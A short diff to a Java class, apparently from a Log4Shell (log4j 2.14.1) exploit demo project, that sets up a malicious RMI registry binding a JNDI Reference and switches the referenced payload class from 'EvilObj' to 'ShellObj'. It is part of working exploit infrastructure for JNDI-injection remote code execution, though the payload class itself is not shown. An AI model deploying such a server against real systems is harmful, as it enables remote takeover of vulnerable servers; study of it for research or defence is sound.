@@ -14,7 +14,7 @@ public class RMIService{
         Registry registry  = LocateRegistry.createRegistry(1098);
 
         System.out.println("Create RMI registry on port 1098");
-        Reference reference = new Reference("com.upuphub.jmeta.rmi.log4j2141.haker.EvilObj","com.upuphub.jmeta.rmi.log4j2141.haker.EvilObj",null);
+        Reference reference = new Reference("com.upuphub.jmeta.rmi.log4j2141.haker.ShellObj","com.upuphub.jmeta.rmi.log4j2141.haker.ShellObj",null);
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
 
         registry.bind("hello",referenceWrapper);
